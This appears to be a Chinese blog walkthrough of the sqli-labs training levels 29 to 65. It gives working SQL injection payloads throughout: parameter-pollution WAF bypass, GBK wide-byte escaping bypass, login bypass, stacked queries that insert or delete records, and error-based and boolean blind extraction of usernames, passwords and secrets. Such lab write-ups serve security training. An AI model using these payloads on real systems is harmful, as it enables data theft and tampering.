$qs = $_SERVER['QUERY_STRING'];
首先读取了 qs 就是用户输入的字符串
	$hint=$qs;
传入 hint
	$id1=java_implimentation($qs);
处理字符串  其中我们传入的是 id=1&id=1'
所以就会返回1 因为读取第一个参数
	$id=$_GET['id'];
这里是安全漏洞的地方！！
重新将用户输入的字符串作为GET的参数
	//echo $id1;
	whitelist($id1);
这里只是比对了处理完的字符串
```

如果我们修改了代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/971d0648a47280885bd7724ea9bf2da7.png" alt="" style="max-height:100px; box-sizing:content-box;" />


### 把id作为我们处理完的字符串 那就无法造成参数污染

我们回到这个题目

既然绕过了 waf 我们就可以直接在第二个参数进行注入



```cobol
?id=2&id=0' union select 1,2,3-- +

?id=2&id=0' union select 1,2,database()-- +
 
?id=2&id=0' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='security'-- +

?id=2&id=0' union select 1,2,group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users'-- +
 
 
 
?id=2&id=0' union select 1,2,group_concat(username,password)from users-- +

```

这里就结束了注入

## Less-30

 [sqli-labs Less-29、30、31（sqli-labs闯关指南 29、30、31）—服务器（两层）架构_景天zy的博客-CSDN博客](https://blog.csdn.net/m0_54899775/article/details/122156208) 

在查资料后发现 这道题没有那么简单

其实更具体点

是通过两个服务器

第一个服务器是解析第一个参数

第二个服务器解析第二个参数

这样我们就绕过了第一个服务器(waf)

30这个题目 就是注入方式是双引号

其他就没有特别的了

```cobol
?id=1&id=0" union select 1,2,3-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d0137a0285becc5c210623210aa6f26d.png" alt="" style="max-height:168px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/a48341492fb0a4cd75b2cb16428f9b1b.png" alt="" style="max-height:145px; box-sizing:content-box;" />


发现还是 只读取了第一个参数 没问题了就重新读取用户输入的GET 从而导致注入

## Less-31

一样还是闭合方式的不同

("id")

```cobol
?id=1&id=1") and 1=1 -- +
```

```cobol
?id=1&id=-1") union select 1,2,3 -- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e4105d3a41fd844ae9fd8255e5fd5415.png" alt="" style="max-height:137px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/f55fde55d7924a3f16eac346f7ed14ef.png" alt="" style="max-height:382px; box-sizing:content-box;" />


## Less-32 宽字节注入

### 我们首先理解什么是宽字节

```undefined
低字节 就是 一个字节来表示的
 
宽字节 就是 两个字节来表示的
 
例如汉字 就是需要两个字节来表示
```

mysql中的GBK就是宽字节之一 当mysql使用GBK的时候 遇到两个字节 就会认为其是一个汉字

```cobol
但是GBK的识别是有范围的
 
第一个字节 0x81 到 0xFE
 
第二个字节 0x40 到 0xFE
```

### 介绍完宽字节 我们回到这个题目进行看看注入的原理

首先看看源代码

```cobol
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
遇到 \ 转义为 \\
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
遇到 ' 转义为 \'
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
遇到 " 转义为 \"
    
    return $string;
}
```

这里是转义的地方

```php
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

其次就是指定了 GBK格式进行存入 这里就会出现宽字节注入

我们看看输入一个中文的单引号



<img src="https://i-blog.csdnimg.cn/blog_migrate/6d2f5cd75ed0ae4eb96ae33a48da1672.png" alt="" style="max-height:147px; box-sizing:content-box;" />


通过这个判断 可能不是直接过滤符号 而是进行转义



<img src="https://i-blog.csdnimg.cn/blog_migrate/b79b55181c9bed1017814d2c2b2f3c2a.png" alt="" style="max-height:196px; box-sizing:content-box;" />




```erlang
\'的hex为
%5c%27
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/2df06f0ea389fd2297367b1ae32182f1.png" alt="" style="max-height:85px; box-sizing:content-box;" />


在这发现遇到'就会加上\

%5c在范围0x40-0xFE中 符合第二个字节

### 那我们只要输入一个符合第一个字节的 就可以让GBK编码认为 这个是一个汉字 然后就吞掉\转义符

```cobol
-1%8F%27%20union%20select%201,2,3--%20+
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/eb37797ac324cb97650d7bf8967d53a2.png" alt="" style="max-height:267px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/3e5b9715a74f35ca3a8acee880dddce6.png" alt="" style="max-height:110px; box-sizing:content-box;" />


首先是字符型 所以只会读取第一个数字来查询

所以后面的汉字对查询没有影响

```cobol
-1%8F%27%20union%20select%201,2,database()--%20+
```

爆破表

```cobol
-1%8F%27%20union%20select%201,group_concat(table_name),2%20from%20information_schema.tables%20where%20table_schema=0x7365637572697479--%20+
```

这里是将数据库名 通过 ascii转码 变为16进制

因为我们要输入字符串 就会需要''来包裹 所以我们直接输入16进制即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/9173a68d1f44de2ce9d6129c57fd2147.png" alt="" style="max-height:560px; box-sizing:content-box;" />


字段

```cobol
-1%8F%27%20union%20select%201,group_concat(column_name),2%20from%20information_schema.columns%20where%20table_schema=0x7365637572697479%20and%20table_name=0x7573657273--%20+
```

值

```cobol
-1%8F%27%20union%20select%201,group_concat(id,username,password),2%20from%20users--%20+
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/74f2dc1fbefc1ca764daed5e674757c5.png" alt="" style="max-height:331px; box-sizing:content-box;" />


## Less-33

一样的' 闭合宽字节注入

## Less-34  POST类型的宽字节注入

变回了POST类型

需要先登入进去再注入

所以我们看看万能密码

这个题目最好通过bp来进行注入 防止二次编码

```cobol
uname=-1%df%27+ or 1--+%2B&passwd=1&submit=Submit
```

登入成功



<img src="https://i-blog.csdnimg.cn/blog_migrate/dadaf8a3a27c4438b0ded2c15bd68efb.png" alt="" style="max-height:96px; box-sizing:content-box;" />


```cobol
uname=-1%df%27+ union select 1,2--+%2B&passwd=1&submit=Submit
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f348727bdbe81d292862cef972070c79.png" alt="" style="max-height:175px; box-sizing:content-box;" />


那就可以

直接开始注入了

```cobol
uname=-1%df%27+ union select 1,database()--+%2B&passwd=1&submit=Submit
 
uname=-1%df%27+ union select 1,group_concat(table_name)from information_Schema.tables where table_schema=database()--+%2B&passwd=1&submit=Submit
 
 
uname=-1%df%27+ union select 1,group_concat(column_name)from information_Schema.columns where table_schema=database()and table_name=0x7573657273--+%2B&passwd=1&submit=Submit
 
 
uname=-1%df%27+ union select 1,group_concat(id,username,password)from  users--+%2B&passwd=1&submit=Submit
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4ae24cbf5279ff515fa9b23381b55ac7.png" alt="" style="max-height:104px; box-sizing:content-box;" />


这样就注入成功

## Less-35  整型宽字节注入

啥也没有 就是整型注入

在查询 users的时候通过宽字节来注入即可

## Less-36

和之前一样可以使用宽字节注入

这题和之前不一样的地方只是过滤函数的不同





<img src="https://i-blog.csdnimg.cn/blog_migrate/ee1cf312142c39aa7bd31cf819624774.png" alt="" style="max-height:135px; box-sizing:content-box;" />


前几关使用的是addslashes

都是对特殊符号加转义 但是其中还是存在不同的

## Less-37



<img src="https://i-blog.csdnimg.cn/blog_migrate/0829751aed2b89da1360301eae98c138.png" alt="" style="max-height:326px; box-sizing:content-box;" />


POST类型

```haskell
1%df' union select 1,group_concat(table_name)from information_schema.tables where table_schema=database()-- +
```

一样使用宽字节即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/6539834b4b1e82e2cf4726e412504096.png" alt="" style="max-height:95px; box-sizing:content-box;" />


## Less-38 堆叠注入

我们首先了解堆叠注入的条件



<img src="https://i-blog.csdnimg.cn/blog_migrate/172aa3c3572eee34d0a10e9deaaab0b7.png" alt="" style="max-height:167px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/979dd415fba092c5ad39349f2099c6b6.png" alt="" style="max-height:124px; box-sizing:content-box;" />




只有当文件中存在这种 可以向数据库一下提交多次查询的函数

才可以使用堆叠注入

因为mysq_query只会上传一个查询语句

其次什么是堆叠注入呢

在mysql中 一个 ; 就是一个语句的结束

所以我们可以在一行中通过; 来写入多个语句

```cobol
SELECT * FROM `users` WHERE id=1;select * from users;
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/bcffb2adfa3eca294c8fd41bd9d430a5.png" alt="" style="max-height:837px; box-sizing:content-box;" />


发现返回了两个查询的语句

这里就是堆叠注入的地方

这里和union注入一样 都要让第一个查询失败



<img src="https://i-blog.csdnimg.cn/blog_migrate/ce357f222e79392fec6f8edecb79f58d.png" alt="" style="max-height:733px; box-sizing:content-box;" />


这样就会返回第二个查询的内容了

这道题不限制于查询 主要堆叠注入可以对数据库进行增删改查的操作

```haskell
1'; insert users(id,username,password) values ("100","li","x")-- +
```

访问id=100



<img src="https://i-blog.csdnimg.cn/blog_migrate/413f2a548efdd51ae2ea530633557580.png" alt="" style="max-height:179px; box-sizing:content-box;" />


同时我们可以删除

```vbnet
1'; DELETE FROM users WHERE id = 100 -- +
```

这里我们就可以对数据库的内容进行操作

## Less-39

一样的 堆叠注入 但是闭合是整数类型的



<img src="https://i-blog.csdnimg.cn/blog_migrate/93d4fed7ce3b59b3a89885af806c802d.png" alt="" style="max-height:291px; box-sizing:content-box;" />






<img src="https://i-blog.csdnimg.cn/blog_migrate/4550652d15e3a0040a970bb543bb12be.png" alt="" style="max-height:122px; box-sizing:content-box;" />


## Less-40

依然是堆叠 闭合条件为 1')

## Less-41



<img src="https://i-blog.csdnimg.cn/blog_migrate/67af19028afc8064d5c8308142f65cd7.png" alt="" style="max-height:369px; box-sizing:content-box;" />


整型



<img src="https://i-blog.csdnimg.cn/blog_migrate/c424479059dac3d38f95978cec2d0b86.png" alt="" style="max-height:54px; box-sizing:content-box;" />


可以使用堆叠注入

```cobol
/?id=1;insert into users(id,username,password) values ('100','li','x')-- +
```

## Less-42  密码处实现堆叠注入



<img src="https://i-blog.csdnimg.cn/blog_migrate/9e79c1e2c45a2a3658ca2288053ea23e.png" alt="" style="max-height:449px; box-sizing:content-box;" />


让我们登入后再继续

通过fuzz 发现无法实现注入

我们猜测是不是在username 或者 password中存在堆叠注入

经过测试在密码处存在注入

```cobol
login_user=admin&login_password=aa';insert into users(id,username,password) values('100','123','123');-- +&mysubmit=Login
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/92d0f2ad1a5a562f0c07c19893af64cd.png" alt="" style="max-height:113px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/d89032da7fc446bb73c106c2b60cb4d1.png" alt="" style="max-height:552px; box-sizing:content-box;" />


成功登入

看看源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/a54dcefbee877ac1e83c8c37bc0e9706.png" alt="" style="max-height:107px; box-sizing:content-box;" />


同时发现了为什么无法在用户名处 进行注入



<img src="https://i-blog.csdnimg.cn/blog_migrate/256157e25562d8f48ff699def7f7e19d.png" alt="" style="max-height:124px; box-sizing:content-box;" />


这里就发现了

只有用户名处存在注入点

## Less-43

```vbnet
admin
 
1'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0cf6f9f61d8180d8201b1c6d7c58d9ce.png" alt="" style="max-height:164px; box-sizing:content-box;" />


发现还是在密码处

发现是1')闭合

```vbnet
1');create table hack like users;-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/6464b28a91b6c9072cdb74b4ab444d61.png" alt="" style="max-height:118px; box-sizing:content-box;" />


注入成功

## Less-44

没有报错信息

所以就是猜测

但是是和42一样的

```cobol
admin
a';insert into users(id,username,password) values ('44','less44','hello')#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4b32a805c5d7fe4dadff358f07792bd5.png" alt="" style="max-height:113px; box-sizing:content-box;" />


## Less-45

和43一样

但是也不存在回显



<img src="https://i-blog.csdnimg.cn/blog_migrate/2c9ce6f8e63c530becee2d45d9a5e590.png" alt="" style="max-height:102px; box-sizing:content-box;" />


## Less-46  order by  的报错注入

首先 传入的参数不一样了



<img src="https://i-blog.csdnimg.cn/blog_migrate/77f5801b2306d01f2afe59d214a12ccb.png" alt="" style="max-height:202px; box-sizing:content-box;" />


我们看看回显

```cobol
?sort=1
?sort=2
?sort=3
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/65852f0790b0adef2ec5c9d8b939e2a7.png" alt="" style="max-height:509px; box-sizing:content-box;" />


发现排列方式不一样

并且如果输入4



<img src="https://i-blog.csdnimg.cn/blog_migrate/567c541208b472c666e080f7f2d9e00a.png" alt="" style="max-height:149px; box-sizing:content-box;" />


所以我们猜测是order by 类型

这里因为 order by 无法联合查询



<img src="https://i-blog.csdnimg.cn/blog_migrate/48c42be4eba8fefad6759328db5e412c.png" alt="" style="max-height:138px; box-sizing:content-box;" />


所以选择报错注入

```cobol
?sort=4 and updatexml(1,0x7e,3)
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8447183cdbb9c65373e34758d79bb727.png" alt="" style="max-height:177px; box-sizing:content-box;" />




```cobol
?sort=4 and updatexml(1,concat(0x7e,(select database())),3)
 
 
 
?sort=4 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where and table_schema=database())),3)
 
 
?sort=4 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database())),3)
 
 
 
?sort=4 and updatexml(1,concat(0x7e,(select concat(id,username,password)from users limit 0,1)),3)
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/57503dc062cdd42ca309e9a7e95e279d.png" alt="" style="max-height:67px; box-sizing:content-box;" />




## Less-47

一样的 闭合方式不一样罢了

```vbnet
1' and updatexml(1,concat(0x7e,database()),3)-- +
```

这里注意 因为是字符类型 所以无论输入多少 都是 出现id=1的情况

## Less-48

纯盲注

直接sqlmap跑得了

## Less-49

使用延时注入

## Less-50 整数型的堆叠注入





<img src="https://i-blog.csdnimg.cn/blog_migrate/40f7337c8c15dfeb3532eec2b11795fb.png" alt="" style="max-height:133px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/698abee9634bc7a596f4cd93c26aefcc.png" alt="" style="max-height:144px; box-sizing:content-box;" />


## Less-51 order by 的单引号

测试出来发现是单引号闭合



<img src="https://i-blog.csdnimg.cn/blog_migrate/7e3727acb322b5c3f802b1a27f6c050d.png" alt="" style="max-height:174px; box-sizing:content-box;" />


因为是order by 命令

所以我们使用报错注入

```cobol
?sort=1' and updatexml(1,concat(0x7e,database()),3)-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/768abe8af230c01bd889c96ed419cb30.png" alt="" style="max-height:265px; box-sizing:content-box;" />




```csharp
?sort=1' and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),3)-- +
```

```cobol
/?sort=4' and updatexml(1,concat(0x7e,(select concat(id,username,password)from users limit 0,1)),3)-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/fbae0c6a924727287e633959cd6c3945.png" alt="" style="max-height:151px; box-sizing:content-box;" />


还可以使用堆叠注入

## Less-52

不存在回显 所以不能使用报错注入

可以使用时间注入和堆叠注入



<img src="https://i-blog.csdnimg.cn/blog_migrate/c0d0a6c0477f0e2c486d610b8f5e0aea.png" alt="" style="max-height:121px; box-sizing:content-box;" />


## Less-53

```cobol
?sort=1' -- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/57b56124c96d2a971b71a1bbc4b5ccc4.png" alt="" style="max-height:541px; box-sizing:content-box;" />


判断是字符型

一样没有回显

使用堆叠和延时注入

## Less-54  挑战   联合注入

感觉这个和真实注入差不多

首先判断闭合

```cobol
通过
/?id=1' and 1=2-- +

/?id=1' and 1=1-- +
 
 
来判断我们给予的条件是否实现
 
发现就是单引号闭合
```

我们可以通过联合注入来看看

我们为了省时间 可以直接通过select 来猜测字段

```cobol
?id=0' union select 1,2,3-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d16091cdde14d58477f99dce340b9e61.png" alt="" style="max-height:300px; box-sizing:content-box;" />


开始注入

```cobol
数据库
/?id=0' union select 1,database(),3-- +


challenges


表名
/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- +
 
 
 
35jmel2wn1   随机的
 
 
字段
/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='35jmel2wn1'-- +


id,sessid,secret_A6J8,tryy


值
/?id=0' union select 1,group_concat(secret_A6J8),3 from 35jmel2wn1-- +
```

这道题就结束了

我们看看源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/804d7f44eb9d1b47fb940d83b10bea1e.png" alt="" style="max-height:133px; box-sizing:content-box;" />


## Less-55

和54 就是闭合方式不同

可以通过

```cobol
?id=1) and 1=1 -- +
 
 
?id=1) and 1=2 -- +
```

来判断

然后就是正常的联合注入

```cobol
?id=-1) union select 1,database(),3-- +
 
/?id=0) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- +
 
 
 
 
/?id=0) union select 1,group_concat(column_name),3 from information_schema.columns where table_name='0rji2d40w2'-- +
 
id,sessid,secret_OVSS,tryy
 
/?id=0) union select 1,group_concat(secret_OVSS),3 from 35jmel2wn1-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a75446fa9dc07e05953d1392249e8723.png" alt="" style="max-height:115px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/3ce398daef88c29146827ce42ee093ea.png" alt="" style="max-height:94px; box-sizing:content-box;" />


## Less-56

也只是闭合上的区别

```cobol
?id=1') and 1=1-- +

?id=1') and 1=2-- +
```

```cobol
/?id=0') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- +




/?id=0') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='yf95voxbok'-- +
 
id,sessid,secret_S6RT,tryy
 
/?id=0') union select 1,group_concat(secret_S6RT),3 from yf95voxbok-- +

```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0d06d43195ec28148b51f0fb955b0c4c.png" alt="" style="max-height:169px; box-sizing:content-box;" />


## Less-57

一样只是修改了闭合方式

```cobol
?id=1" and 1=1-- +


?id=1" and 1=2-- +
```

```cobol
/?id=0" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- +




/?id=0" union select 1,group_concat(column_name),3 from information_schema.columns where table_name='yf95voxbok'-- +
 
id,sessid,secret_S6RT,tryy
 
/?id=0" union select 1,group_concat(secret_S6RT),3 from yf95voxbok-- +

```



<img src="https://i-blog.csdnimg.cn/blog_migrate/add1f16234c2b46424bcb42a3a0612fa.png" alt="" style="max-height:197px; box-sizing:content-box;" />


## Less-58   报错

这道题出现了报错信息

我们就可以顺着使用报错注入

因为 联合注入是行不通的

```cobol
?id=1' and 1=1-- +

?id=1' and 1=2-- +
```

然后就可以报错注入了

```cobol
?id=1'and updatexml(1,0x7e,3)-- +

?id=1'and updatexml(1,concat(0x7e,database()),3)-- +
 
 
?id=1'and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),3)-- +


tmggp2ky9p


?id=1'and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='
tmggp2ky9p' and table_schema=database())),3)-- +
 
 
id,sessid,secret_KYSC,tryy
 
 
?id=1'and updatexml(1,concat(0x7e,(select group_concat(secret_KYSC) from tmggp2ky9p)),3)-- +
```

我们看看源代码为什么过滤了 union



<img src="https://i-blog.csdnimg.cn/blog_migrate/03857ebdfab3ff3a54bc20e123b645ba.png" alt="" style="max-height:394px; box-sizing:content-box;" />


发现没有过滤 就是单纯没有通过 数据库查询

是自己设定了数组 然后还有倒序作为密码

## Less-59

闭合方式的不同

这个是整数型

```cobol
?id=1 and 1=1-- +
 
?id=1 and 1=2-- +
```

```cobol
?id=1 and updatexml(1,0x7e,3)-- +
 
?id=1 and updatexml(1,concat(0x7e,database()),3)-- +
 
 
?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),3)-- +
 
 
 
?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='
h9ewaort0y' and table_schema=database())),3)-- +
 
 
 
 
?id=1 and updatexml(1,concat(0x7e,(select group_concat(secret_N4QY) from h9ewaort0y)),3)-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/27a2d6dfe59a7e42266663eec7bf0afd.png" alt="" style="max-height:164px; box-sizing:content-box;" />




## Less-60

闭合方式

通过报错可以发现

为 ")

```cobol
?id=1")and updatexml(1,0x7e,3)-- +

?id=1") and updatexml(1,concat(0x7e,database()),3)-- +
 
 
?id=1") and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),3)-- +



?id=1") and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='
6nz8my2yxq' and table_schema=database())),3)-- +
 
 
 
 
?id=1") and updatexml(1,concat(0x7e,(select group_concat(secret_XSNF) from 6nz8my2yxq)),3)-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8ee722ca2416da1d0b9b2377daefb23f.png" alt="" style="max-height:160px; box-sizing:content-box;" />


## Less-61



<img src="https://i-blog.csdnimg.cn/blog_migrate/588fdaa25eeed828f2b483753e5407db.png" alt="" style="max-height:91px; box-sizing:content-box;" />




```cobol
?id=1'))and updatexml(1,0x7e,3)-- +

?id=1')) and updatexml(1,concat(0x7e,database()),3)-- +
 
 
?id=1')) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),3)-- +



?id=1')) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='
r2gmu06c2g' and table_schema=database())),3)-- +
 
 
 
 
?id=1')) and updatexml(1,concat(0x7e,(select group_concat(secret_WHAM) from r2gmu06c2g)),3)-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a245bd81ba9d6a8c25a23b661dfaeeaa.png" alt="" style="max-height:220px; box-sizing:content-box;" />


## Less-62

布尔注入 没有回显 没有报错

```cobol
1' 没有回显
1" 有回显
1') 没有回显
1')-- + 有回显
```

确定了闭合为 ')

然后就是布尔注入

```cobol
数据库
?id=1') and length((select database()))=10 -- +

?id=1') and ascii(substr((select database()),1,1))=99 -- +
 
 
表
?id=1') and length((select group_concat(table_name)from information_schema.tables where table_schema=database()))=10 -- +


?id=1') and ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),1,1))=114 -- +
 
字段
?id=1') and length((select group_concat(column_name)from information_schema.columns where table_name='rxwyb1c5dx' and table_schema=database()))=26 -- +

?id=1') and ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='rxwyb1c5dx' and table_schema=database()),1,1))=105 -- +
 
 
值
?id=1') and length((select group_concat(secret_Z22L)from rxwyb1c5dx))=24 -- +


?id=1') and ascii(substr((select group_concat(secret_Z22L)from rxwyb1c5dx),1,1))=53 -- +
```

## Less-63

闭合方式为

```cobol
?id=1")-- +
```

一样布尔注入

## Less-64

```cobol
?id=1))-- +
```

## Less-65

```cobol
?id=1)-- +
```

这里sqlilab就结束了